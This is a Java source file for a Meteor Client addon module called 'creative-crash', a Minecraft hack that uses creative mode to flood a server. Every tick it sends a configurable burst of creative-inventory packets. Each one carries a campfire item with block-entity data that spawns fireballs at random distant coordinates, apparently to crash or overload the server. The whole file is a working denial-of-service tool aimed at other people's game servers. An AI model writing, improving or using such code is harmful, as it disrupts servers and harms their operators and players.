package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.entity.BlockEntityType;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.entity.TypedEntityData;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.Random;

public class CreativeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(15).min(1).sliderMax(100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private final Random random = new Random();

    public CreativeCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "creative-crash",
            "Sends creative-set-slot packets with a block-entity-data payload spawning fireballs. Requires creative mode.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        if (!mc.player.getAbilities().creativeMode) {
            error("Requires creative mode, toggling.");
            toggle();
            return;
        }

        NbtCompound tag = new NbtCompound();
        NbtList pos = new NbtList();
        pos.add(NbtDouble.of(random.nextInt(0xFFFFFF)));
        pos.add(NbtDouble.of(255));
        pos.add(NbtDouble.of(random.nextInt(0xFFFFFF)));
        tag.putString("id", "minecraft:small_fireball");
        tag.put("Pos", pos);

        ItemStack stack = new ItemStack(Items.CAMPFIRE);
        stack.set(DataComponentTypes.BLOCK_ENTITY_DATA, TypedEntityData.create(BlockEntityType.CAMPFIRE, tag));

        for (int i = 0; i < amount.get(); i++) {
            mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
